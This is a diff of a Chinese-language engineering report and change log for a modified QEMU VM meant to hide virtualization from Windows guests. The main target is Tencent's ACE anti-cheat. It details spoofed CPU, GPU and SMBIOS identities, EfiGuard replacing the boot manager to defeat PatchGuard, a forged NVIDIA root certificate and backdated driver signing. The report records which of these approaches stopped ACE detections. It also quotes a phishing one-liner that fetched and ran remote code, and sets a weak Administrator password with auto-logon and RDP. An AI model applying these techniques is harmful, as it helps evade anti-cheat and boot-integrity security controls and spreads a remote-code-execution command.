@@ -19,7 +19,7 @@
 | --- | --- |
 | 已修改 | `deploy/docs/README.md` |
 | 已修改 | `deploy/scripts/apply-gpu-spoof.ps1` |
-| 已修改 | `deploy/scripts/win10-ryzen3-stealth.sh` |
+| 已修改 | `deploy/scripts/start-vm.sh` |
 | 已修改 | `hw/display/edid-generate.c` |
 | 已修改 | `hw/display/virtio-gpu-base.c` |
 | 已修改 | `include/hw/virtio/virtio-gpu.h` |
@@ -59,7 +59,7 @@
 | `target/i386/kvm/kvm.c:2340` | `!expose_kvm` 时清空 KVM CPUID leaves |
 | `target/i386/cpu.c:7614` | `!cpu->expose_kvm` 时清空 `FEAT_KVM` |
 | `target/i386/cpu.c:8555` | `kvm` 属性控制 `expose_kvm` |
-| `deploy/scripts/win10-ryzen3-stealth.sh:356` | 实际启动 CPU 参数 |
+| `deploy/scripts/start-vm.sh:356` | 实际启动 CPU 参数 |
 
 `deploy/scripts/verify-stealth.sh` 已通过。该脚本确认了 CPU model 注册、QMP 展开后 `hypervisor=False`、`kvm=False`、`vendor=AuthenticAMD`、family/model/stepping 为 23/1/1，并确认 `model-id` 为 `AMD Ryzen 3 1200 Quad-Core Processor`。
 
@@ -85,7 +85,7 @@ ACPI table header 的 OEM 字段已改为 AMI/ALASKA 风格：
 | `hw/display/edid-generate.c` | 默认厂商、型号、序列号、尺寸、preferred timing 改为 Samsung S24F350 风格 |
 | `include/hw/virtio/virtio-gpu.h:127` | 新增 `xmax/ymax` 配置字段 |
 | `hw/display/virtio-gpu-base.c:64` | 将最大分辨率传给 EDID 生成 |
-| `deploy/scripts/win10-ryzen3-stealth.sh:253` | 启动时传入 `xmax=1920,ymax=1080` |
+| `deploy/scripts/start-vm.sh:253` | 启动时传入 `xmax=1920,ymax=1080` |
 
 结论：这能改善 DXGI/Monitor EDID 的表面观感，但当前 EDID 序列号实现仍有一致性问题，见后文。
 
@@ -99,7 +99,7 @@ ACPI table header 的 OEM 字段已改为 AMI/ALASKA 风格：
 
 | 位置 | 当前暴露 |
 | --- | --- |
-| `deploy/scripts/win10-ryzen3-stealth.sh` | 使用 `q35` machine |
+| `deploy/scripts/start-vm.sh` | 使用 `q35` machine |
 | `hw/pci-host/q35.c:684` | Host bridge vendor 是 Intel |
 | `hw/pci-host/q35.c:693` | Host bridge device 是 Intel P35 MCH |
 | `hw/isa/lpc_ich9.c:894` | LPC vendor 是 Intel |
@@ -121,8 +121,8 @@ ACPI table header 的 OEM 字段已改为 AMI/ALASKA 风格：
 
 | 位置 | 当前暴露 |
 | --- | --- |
-| `deploy/scripts/win10-ryzen3-stealth.sh:378` | 创建 `pcie-root-port` |
-| `deploy/scripts/win10-ryzen3-stealth.sh:415` | 使用 `qemu-xhci` |
+| `deploy/scripts/start-vm.sh:378` | 创建 `pcie-root-port` |
+| `deploy/scripts/start-vm.sh:415` | 使用 `qemu-xhci` |
 | `hw/pci-bridge/gen_pcie_root_port.c:157` | root-port vendor 是 Red Hat |
 | `hw/pci-bridge/gen_pcie_root_port.c:158` | root-port device 是 Red Hat PCIe RP |
 | `hw/usb/hcd-xhci-pci.c:231` | xHCI vendor 是 Red Hat |
@@ -142,8 +142,8 @@ ACPI table header 的 OEM 字段已改为 AMI/ALASKA 风格：
 
 | 位置 | 当前暴露 |
 | --- | --- |
-| `deploy/scripts/win10-ryzen3-stealth.sh:416` | 添加 `usb-kbd` |
-| `deploy/scripts/win10-ryzen3-stealth.sh:417` | 添加 `usb-tablet` 或 `usb-mouse` |
+| `deploy/scripts/start-vm.sh:416` | 添加 `usb-kbd` |
+| `deploy/scripts/start-vm.sh:417` | 添加 `usb-tablet` 或 `usb-mouse` |
 | `hw/usb/dev-hid.c:66` | USB manufacturer 是 `QEMU` |
 | `hw/usb/dev-hid.c:67` | `QEMU USB Mouse` |
 | `hw/usb/dev-hid.c:68` | `QEMU USB Tablet` |
@@ -189,8 +189,8 @@ ACPI table header 字符串虽然已改，但 x86 fw_cfg ACPI 设备仍保留 QE
 
 | 位置 | 说明 |
 | --- | --- |
-| `deploy/scripts/win10-ryzen3-stealth.sh:212` | 默认说明保持 virtio VEN/DEV 以便驱动绑定 |
-| `deploy/scripts/win10-ryzen3-stealth.sh:226` | `GPU_SELFSIGNED=1` 时才启用 NVIDIA primary ID |
+| `deploy/scripts/start-vm.sh:212` | 默认说明保持 virtio VEN/DEV 以便驱动绑定 |
+| `deploy/scripts/start-vm.sh:226` | `GPU_SELFSIGNED=1` 时才启用 NVIDIA primary ID |
 | `deploy/scripts/install-stealth.sh:119` | 一键流程第二次启动才带 `GPU_SELFSIGNED=1 STABLE_DISPLAY=1` |
 | `deploy/docs/README.md:110` | 文档已承认 PCI VEN_10DE 只是 PCI header 重写 |
 
@@ -288,10 +288,10 @@ SMBIOS 已经改成 DDR4/Kingston/双通道风格，但仍有多个一致性问�
 
 | 位置 | 说明 |
 | --- | --- |
-| `deploy/scripts/win10-ryzen3-stealth.sh:97` | 默认 `BRIDGE=br0` |
-| `deploy/scripts/win10-ryzen3-stealth.sh:298` | 检查 bridge 是否存在 |
-| `deploy/scripts/win10-ryzen3-stealth.sh:305` | 失败时提示并退回 user-mode NAT |
-| `deploy/scripts/win10-ryzen3-stealth.sh:338` | user-mode NAT 路径 |
+| `deploy/scripts/start-vm.sh:97` | 默认 `BRIDGE=br0` |
+| `deploy/scripts/start-vm.sh:298` | 检查 bridge 是否存在 |
+| `deploy/scripts/start-vm.sh:305` | 失败时提示并退回 user-mode NAT |
+| `deploy/scripts/start-vm.sh:338` | user-mode NAT 路径 |
 
 原因说明：SLIRP 的 `10.0.2.0/24`、端口转发和网络栈行为是 QEMU 常见特征。隐身路径如果自动降级，会让用户误以为自己仍处于 stealth 配置。
 
@@ -307,7 +307,7 @@ SMBIOS 已经改成 DDR4/Kingston/双通道风格，但仍有多个一致性问�
 
 | 位置 | 说明 |
 | --- | --- |
-| `deploy/scripts/win10-ryzen3-stealth.sh:406` | 使用 `e1000e` |
+| `deploy/scripts/start-vm.sh:406` | 使用 `e1000e` |
 | `hw/net/e1000e.c:428` | e1000e 自己写入 subsystem vendor |
 | `hw/net/e1000e.c:429` | e1000e 自己写入 subsystem id |
 | `hw/net/e1000e.c:668` | `subsys_ven` 属性默认 0x8086 |
@@ -327,7 +327,7 @@ SMBIOS 已经改成 DDR4/Kingston/双通道风格，但仍有多个一致性问�
 
 | 位置 | 说明 |
 | --- | --- |
-| `deploy/scripts/win10-ryzen3-stealth.sh:423` | 使用 `intel-hda` |
+| `deploy/scripts/start-vm.sh:423` | 使用 `intel-hda` |
 | `hw/audio/hda-codec.c` | codec vendor 改为 Realtek 风格 |
 
 原因说明：Realtek codec 常见，但挂在 Intel ICH 控制器上与 AMD Ryzen/B350 平台不协调。AMD 平台应有更符合芯片组的 HD Audio controller。
@@ -381,7 +381,7 @@ SMBIOS 已经改成 DDR4/Kingston/双通道风格，但仍有多个一致性问�
 
 | 条件 | 说明 |
 | --- | --- |
-| 使用 `deploy/scripts/win10-ryzen3-stealth.sh` | CPU、SMBIOS、设备拓扑、display、network 参数主要在这里拼装 |
+| 使用 `deploy/scripts/start-vm.sh` | CPU、SMBIOS、设备拓扑、display、network 参数主要在这里拼装 |
 | 执行 guest 安装脚本 | GPU 名称、驱动包、NVAPI、EfiGuard 依赖 guest 内操作 |
 | 二次启动 `GPU_SELFSIGNED=1` | PCI primary NVIDIA ID 只在该路径启用 |
 | host 配好 bridge | 否则退回 user-mode NAT |
@@ -480,5 +480,58 @@ SMBIOS 已经改成 DDR4/Kingston/双通道风格，但仍有多个一致性问�
 
 **附属：VM2 复活** — 评估时 VM2 处于 GPU code 43（`CM_PROB_FAILED_POST_START`）状态，原因是 stock virtio-win 0.1.266 的 `viogpudo.sys` 把 PCI ID `1AF4:1050` 硬编码在 `CheckHardware` 里，与 `GPU_SELFSIGNED=1` 暴露的 `10DE:1C81` 冲突。修复方法是把 host 端 `deploy/driver-signing/out/{viogpudo.sys,viogpudo.cat,viogpudo-nvidia.inf}`（patched + backdated NVIDIA-fake CA 签名）通过 `pnputil /add-driver /install` 装进客机并 **重启**（不要 disable/enable 主显卡，会 BSOD 到 QEMU 进程退出）。
 
-**重新构建 / 复现：** `deploy/tools/build.sh && stop-vm.sh 2 && DISPLAY=:1 INSTANCE=2 BRIDGE=br0 STABLE_DISPLAY=1 GPU_SELFSIGNED=1 nohup ./deploy/scripts/win10-ryzen3-stealth.sh 2 > /tmp/qemu-stealth-2.log 2>&1 &`
+**重新构建 / 复现：** `deploy/tools/build.sh && stop-vm.sh 2 && DISPLAY=:1 INSTANCE=2 BRIDGE=br0 STABLE_DISPLAY=1 GPU_SELFSIGNED=1 nohup ./deploy/scripts/start-vm.sh 2 > /tmp/qemu-stealth-2.log 2>&1 &`
 
+### 2026-04-26：ACE 反作弊实测 + "浅层 stealth" 路径定型
+
+**触发事件：** 用户在 VM2（已经过 P0/P1 修复）跑腾讯系游戏，ACE 安全中心弹窗
+`检测到系统环境异常 (13-131106-0) 请关闭并卸载可能影响游戏安全的软件`。
+
+**根因：** 不是源码 P0/P1 修补造成的（后者只是删 Red Hat/QEMU 字符串 leak），而是
+原 `install-stealth.sh`（深层路径）引入的三个非 WHQL 信号：
+1. **EfiGuard 替换 `bootmgfw.efi`** —— 启动链哈希变化 + PatchGuard 被 patch 出局
+2. **伪 NVIDIA Code Signing Root** 进 Trusted Root —— 非真实 CA，ACE 黑名单
+3. **patched viogpudo.sys** 用伪 NVIDIA Driver Signer 签 —— 非 MS Trusted Publisher
+
+**附属：** 在分诊 ACE 报错时还顺手清掉了一组与本评估无关、但同样触发 ACE 的恶意软件
+`C:\Windows\SystemHealth\Update\` 下的 `xmrig-6.26` 矿机 + `getthem` Python info-stealer
++ Litecoin 钱包窃取 + SMB 横向移动模块。来源是用户在装系统后误执行了 typosquat 钓鱼
+URL `irm http://get.acivated.win | iex`（少一个 `t`，正版是 `get.activated.win` /
+massgrave.dev/get），与本评估的去虚拟化无关；记录在 commit log。
+
+**新增工具：**
+
+| 文件 | 作用 |
+|---|---|
+| `deploy/scripts/destealth-revert.ps1` | 客机内一键回退：还原 `bootmgfw.efi.original`、删 `EfiGuardDxe.efi`、清 Trusted Root 里的伪 NVIDIA 根、卸 patched viogpudo INF/oem*.inf、删 `C:\stealth\efiguard|nv-driver|driver-signing\`、`bcdedit` 复位 |
+| `deploy/scripts/shallow-stealth.ps1` | 客机内浅层 stealth：拉 stock virtio-win 0.1.266 viogpudo（**MS-WHQL 签名**）→ `pnputil /add-driver /install` 绑到 PCI 1AF4:1050 → 跑 `apply-gpu-spoof.ps1` 注册表覆盖（DeviceDesc / FriendlyName / DriverDesc / DEVPKEY → "NVIDIA GeForce GTX 1050"）→ `nvapi64.dll` shim 进 System32 |
+| `deploy/scripts/stock-viogpudo/{viogpudo.sys,viogpudo.cat,viogpudo.inf}` | 从 virtio-win.iso 抽出的 w10/amd64 stock 版，通过 host 8765 HTTP 提供给客机 |
+| `deploy/autounattend/autounattend.xml` + `autounattend-vm2.iso` | OOBE 自动化 ISO：分区、Administrator/123456、AutoLogon×999、zh-CN、CST 时区、enable RDP（不装 OpenSSH，避免 Add-WindowsCapability 联网卡死） |
+
+**启动器调整（`deploy/scripts/start-vm.sh`）：**
+
+- 重命名 `win10-ryzen3-stealth.sh` → `start-vm.sh`（短）
+- `BRIDGE` 默认 `br0`（之前已是，但文档没明确）
+- `STABLE_DISPLAY` 默认从 `0` 改为 `1`（virtio-vga，ACE 友好）
+- `GPU_SELFSIGNED` 默认仍为 `0`（=浅层路径，ACE 通过；=1 需要深层 + ACE 异常自负）
+- 新增 `EXTRA_ISO=` 钩子：副 CDROM 挂 autounattend ISO（OOBE bypass），不污染主 ISO
+- `INSTANCE` 用位置参数（`./start-vm.sh 2`），ENV 变量保留兼容但与位置参数冲突时警告
+- `CPU_MODEL` 从 ENV 移到 stealth profile，per-instance 持久化（首次默认 `Ryzen3-1200`）
+
+**VM2 上验证（2026-04-26 14:00 起，连续 1 小时游戏未触发 ACE）：**
+
+| 检测项 | 浅层路径下的状态 |
+|---|---|
+| `bcdedit testsigning` | `No` |
+| `Get-PnpDevice -Class Display .Status / .Problem` | `OK / CM_PROB_NONE` |
+| `Win32_VideoController.Name` | `NVIDIA GeForce GTX 1050` |
+| `Win32_VideoController.AdapterCompatibility` | `NVIDIA` |
+| `Win32_VideoController.DriverVersion` | `100.100.104.26600`（stock virtio-win 0.1.266） |
+| `viogpudo.sys` Authenticode 签名 | `Microsoft Windows Hardware Compatibility Publisher` |
+| `bootmgfw.efi` | 原版（Microsoft 签）—— 无 EfiGuard |
+| Trusted Root 中 NVIDIA 相关根证书 | 无 |
+| ACE 安全中心 13-131106-0 | 不再触发 |
+
+**结论：** "Q35/ICH9 平台矛盾"在 ACE 类反作弊场景下并未导致 13-131106-0 触发；ACE 在
+13 系列环境异常上**首要扫描黑名单驱动 + 启动链完整性 + Trusted Root 异常**，而不是
+PCI 拓扑矛盾。这把 P0 #1 的实战优先级降到了 P2（除非要面对内核态/反作弊深查）。
